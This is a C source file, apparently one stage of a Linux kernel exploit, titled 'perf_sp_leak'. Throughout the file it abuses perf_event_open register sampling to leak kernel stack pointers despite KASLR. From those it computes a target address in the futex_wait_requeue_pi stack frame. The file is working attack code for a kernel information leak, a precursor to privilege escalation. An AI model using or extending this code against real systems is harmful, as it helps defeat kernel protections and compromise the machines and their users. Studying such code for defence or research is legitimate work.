/*
 * perf_sp_leak.c — Phase 1v3: dump ALL samples (no IP filter)
 * KASLR shifts kernel text to 0xffffffe3..., not our expected 0xffffffc0...
 * Strategy: dump all (IP, SP) pairs, then use SP relationship to identify
 * futex_wait_requeue_pi samples.
 */
#include "common.h"
#include <linux/perf_event.h>

#define W_DELTA 0x90

int g_perf_fd = -1;
void *g_perf_buf = NULL;
size_t g_perf_msz = 0;

void perf_sp_start(void) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 50;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << 32) - 1;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.exclude_idle = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { pr_warning("perf_open failed %d\n", errno); return; }
    size_t msz = 4096 * (1 + 32);
    void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return; }
    g_perf_fd = fd; g_perf_buf = buf; g_perf_msz = msz;
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
}

void perf_sp_stop_and_report(void) {
    if (g_perf_fd < 0) return;
    ioctl(g_perf_fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *hdr = g_perf_buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char *)g_perf_buf + 4096;
    size_t dsz = 4096 * 32;
    uint64_t pos = hdr->data_tail;

    int total = 0;
    /* Store all (IP, SP) pairs */
    uint64_t all_ip[2048], all_sp[2048];
    int nall = 0;

    while (pos < head && nall < 2048) {
        struct perf_event_header *ev = (void *)(base + (pos % dsz));
        if (ev->size == 0) break;
        if (ev->type == PERF_RECORD_SAMPLE) {
            total++;
            char *p = (char *)ev + sizeof(*ev);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t abi = *(uint64_t *)p; p += 8;
            if (abi == 1 || abi == 2) {
                uint64_t *regs = (uint64_t *)p;
                uint64_t sp = regs[31]; /* SP */
                all_ip[nall] = ip;
                all_sp[nall] = sp;
                nall++;
            }
        }
        pos += ev->size;
    }

    hdr->data_tail = head;
    munmap(g_perf_buf, g_perf_msz);
    close(g_perf_fd);
    g_perf_fd = -1;

    pr_info("perf: total=%d with_regs=%d\n", total, nall);

    /* Strategy: group by unique SP values.
     * If many samples share the same SP, that SP likely corresponds to
     * a function where SP is constant (like futex_wait_requeue_pi after prologue).
     * For those, W = SP + 0x90. */

    /* Count unique SP values */
    uint64_t uniq_sp[256];
    int uniq_cnt[256];
    int nuniq = 0;

    for (int i = 0; i < nall; i++) {
        uint64_t sp = all_sp[i];
        int found = 0;
        for (int j = 0; j < nuniq; j++) {
            if (uniq_sp[j] == sp) { uniq_cnt[j]++; found = 1; break; }
        }
        if (!found && nuniq < 256) { uniq_sp[nuniq] = sp; uniq_cnt[nuniq] = 1; nuniq++; }
    }

    /* Sort by count descending */
    for (int i = 0; i < nuniq; i++) {
        for (int j = i+1; j < nuniq; j++) {
            if (uniq_cnt[j] > uniq_cnt[i]) {
                uint64_t ts = uniq_sp[i]; uniq_sp[i] = uniq_sp[j]; uniq_sp[j] = ts;
                int tc = uniq_cnt[i]; uniq_cnt[i] = uniq_cnt[j]; uniq_cnt[j] = tc;
            }
        }
    }

    pr_info("=== unique SP values (top 10) ===\n");
    for (int i = 0; i < nuniq && i < 10; i++) {
        pr_info("  SP=0x%016llx  count=%d  W=0x%016llx\n",
                uniq_sp[i], uniq_cnt[i], uniq_sp[i] + W_DELTA);
    }

    /* If top SP has many samples (>5), it's likely a stable-frame function */
    if (nuniq > 0 && uniq_cnt[0] >= 3) {
        pr_success("Top SP has %d samples — likely stable frame\n", uniq_cnt[0]);
        pr_success("W_candidate = 0x%016llx\n", uniq_sp[0] + W_DELTA);
    }
}

int perf_sp_leak_experiment(void) { return 0; }
